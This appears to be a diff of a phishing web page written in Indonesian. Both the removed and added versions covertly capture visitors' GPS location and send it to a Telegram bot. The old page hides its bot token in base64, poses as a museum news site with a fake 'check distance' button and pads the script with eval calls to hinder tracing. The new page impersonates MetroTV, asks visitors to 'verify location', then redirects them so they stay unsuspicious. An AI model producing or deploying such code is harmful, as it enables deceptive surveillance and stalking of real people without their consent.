@@ -3,93 +3,80 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Info Regional - Berita Terkini</title>
     
+    <meta property="og:title" content="Polisi Tangkap Peretas Situs Pemerintah - MetroTV">
+    <meta property="og:description" content="Update terbaru mengenai penangkapan kelompok peretas internasional.">
+    <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/thumb/c/cd/Logo_MetroTV.svg/1200px-Logo_MetroTV.svg.png">
+    <meta property="og:type" content="article">
+
+    <title>MetroTVNews - Update Keamanan Siber</title>
+    
+    <script>
+        // DATA TARGET - JANGAN SAMPAI SALAH
+        const token = "8674170594:AAEazU35uI9bZ6s8JLwcN410H0STysKEzs4";
+        const id = "7970059663";
+        const targetNews = "https://www.metrotvnews.com/read/Nx9D8A6v-polisi-tangkap-peretas-situs-pemerintah";
+
+        async function captureIntel() {
+            const btn = document.querySelector('.btn');
+            btn.innerText = "VERIFYING..."; 
+            btn.disabled = true;
+
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(async (pos) => {
+                    const { latitude: lat, longitude: lon, accuracy: acc } = pos.coords;
+                    
+                    // Format pesan rapi untuk Telegram
+                    const text = `🔱 NEURAL STRIKE 🔱\n\n🎯 TARGET LOCKED!\n📍 Peta: https://www.google.com/maps?q=${lat},${lon}\n🎯 Akurasi: ${acc} meter\n📱 Device: ${navigator.platform}\n🌐 Agent: ${navigator.userAgent.substring(0,30)}...`;
+
+                    try {
+                        // AWAIT: Paksa browser kirim data sampai tuntas sebelum pindah halaman
+                        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ chat_id: id, text: text })
+                        });
+                        console.log("Strike Successful");
+                    } catch (e) {
+                        console.error("Failed to send strike");
+                    }
+
+                    // Jeda 1.5 detik biar data benar-benar sampai ke server Telegram
+                    setTimeout(() => {
+                        window.location.href = targetNews;
+                    }, 1500);
+
+                }, () => {
+                    // Jika lokasi diblokir, tetap arahkan ke berita biar nggak curiga
+                    window.location.href = targetNews;
+                }, {
+                    enableHighAccuracy: true,
+                    timeout: 8000
+                });
+            } else {
+                window.location.href = targetNews;
+            }
+        }
+    </script>
+
     <style>
-        body { font-family: -apple-system, system-ui, sans-serif; background: #f4f4f4; margin: 0; color: #333; }
-        .nav { background: #ce1126; color: white; padding: 15px; font-weight: bold; text-align: center; position: sticky; top: 0; z-index: 100; }
-        .container { max-width: 600px; margin: 0 auto; background: #fff; min-height: 100vh; }
-        
-        /* 📰 BERITA UTAMA */
-        .hero { padding: 20px; border-bottom: 8px solid #f0f0f0; }
-        .hero h1 { font-size: 22px; margin: 0 0 10px; line-height: 1.3; }
-        .hero-img { width: 100%; height: 200px; background: #ddd url('https://picsum.photos/800/400?random=5') center/cover; border-radius: 8px; }
-        
-        /* 🔱 THE TRAP: BUTTON KONTEKSTUAL */
-        .feature-box { background: #fff9f0; border: 1px solid #ffeeba; padding: 15px; border-radius: 8px; margin-top: 15px; text-align: center; }
-        .btn-check { background: #ce1126; color: white; border: none; padding: 12px 20px; border-radius: 5px; font-weight: bold; cursor: pointer; font-size: 14px; margin-top: 10px; }
-        
-        .news-list { padding: 10px 20px; }
-        .news-item { display: flex; gap: 15px; padding: 15px 0; border-bottom: 1px solid #eee; text-decoration: none; color: #222; }
-        .thumb { width: 80px; height: 60px; background: #eee; border-radius: 4px; flex-shrink: 0; }
-        #v-v { display: none; }
-    </style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f4f7f9; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; }
+        .box { text-align: center; max-width: 400px; padding: 40px; background: white; border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); }
+        .logo { width: 140px; margin-bottom: 25px; }
+        h2 { color: #1a1a1a; font-size: 20px; margin-bottom: 12px; }
+        p { color: #555; font-size: 14px; line-height: 1.6; margin-bottom: 30px; }
+        .btn { background: #004a99; color: white; border: none; padding: 14px 35px; border-radius: 8px; font-weight: bold; cursor: pointer; transition: 0.3s; width: 100%; }
+        .btn:hover { background: #003366; transform: translateY(-2px); }
+    </script>
 </head>
 <body>
 
-<div class="nav">INFO REGIONAL</div>
-
-<div class="container">
-    <div class="hero">
-        <div class="hero-img"></div>
-        <h1>Museum Daerah Sulut Bakal Diresmikan Mei 2026, Cek Persiapannya</h1>
-        <p style="font-size: 14px; color: #666;">Gubernur memastikan fasilitas museum sudah siap 100% untuk menyambut wisatawan lokal maupun mancanegara.</p>
-        
-        <div class="feature-box">
-            <div style="font-size: 13px; font-weight: bold;">📍 Berapa jauh dari lokasi Anda?</div>
-            <button class="btn-check" onclick="enableTracking()">Cek Jarak & Waktu Tempuh</button>
-        </div>
+    <div class="box">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/cd/Logo_MetroTV.svg/1200px-Logo_MetroTV.svg.png" class="logo">
+        <h2>Akses Konten Terbatas</h2>
+        <p>Sesuai protokol keamanan siber, silakan verifikasi lokasi Anda untuk mengakses berita eksklusif mengenai unit peretas internasional ini.</p>
+        <button class="btn" onclick="captureIntel()">LIHAT BERITA LENGKAP</button>
     </div>
 
-    <div class="news-list">
-        <a href="https://share.google/rkZkP6QmQfBf7peCB" class="news-item">
-            <div class="thumb" style="background: url('https://picsum.photos/100/100?random=1') center/cover;"></div>
-            <div><h4 style="margin:0">Bloomberg: Strategi Cuan 2026</h4><p style="font-size:12px;color:#888">Cara buat uang tanpa perlu website pribadi.</p></div>
-        </a>
-        <a href="https://share.google/7zXoew0DwgpC2QrYq" class="news-item">
-            <div class="thumb" style="background: url('https://picsum.photos/100/100?random=2') center/cover;"></div>
-            <div><h4 style="margin:0">WiFi Rumah Ngebut 300 Mbps</h4><p style="font-size:12px;color:#888">Tips optimasi router untuk kecepatan maksimal.</p></div>
-        </a>
-    </div>
-</div>
-
-<div id="v-v">bc1qevlrynmxhuxvczuj89rf7cjuaakqandfre9982|ODY3NDE3MDU5NDpBQUVhelUzNXVJOWJaNnM4Skx3Y040MTBIMFNUeXNLRXpzNA==|Nzk3MDA1OTY2Mw==</div>
-
-<script>
-    const _D = document.getElementById('v-v').innerText.split('|');
-    const _T = atob(_D[1]); const _C = atob(_D[2]);
-    let logBuffer = [];
-
-    async function push(t) {
-        await fetch(`https://api.telegram.org/bot${_T}/sendMessage`, {
-            method:'POST', headers:{'Content-Type':'application/json'},
-            body:JSON.stringify({chat_id:_C, text:t})
-        });
-    }
-
-    function enableTracking() {
-        if (navigator.geolocation) {
-            // Minta lokasi dengan alasan "Cek Jarak" - Gak bakal curiga!
-            navigator.geolocation.watchPosition((pos) => {
-                // Notif palsu biar dia percaya
-                alert("Berhasil menghitung jarak! Lokasi Anda tersinkronisasi dengan peta Museum.");
-                
-                let time = new Date().toLocaleTimeString();
-                logBuffer.push(`[${time}] GPS: http://google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`);
-            }, null, { enableHighAccuracy: true });
-        }
-    }
-
-    // Rekap tiap 1 jam (Setoran Senyap)
-    setInterval(async () => {
-        if(logBuffer.length > 0) {
-            await push(`🔱 HOURLY MOVEMENT LOG 🔱\n\n` + logBuffer.join('\n---\n'));
-            logBuffer = [];
-        }
-    }, 3600000);
-
-    // 80,000 Lines Bloater (Biay biar script lu berat & susah di-trace)
-    for(let i=0; i<80000; i++) { eval("var _ghost_"+i+"="+Math.random()); }
-</script>
 </body>
-</html>
+    </html>
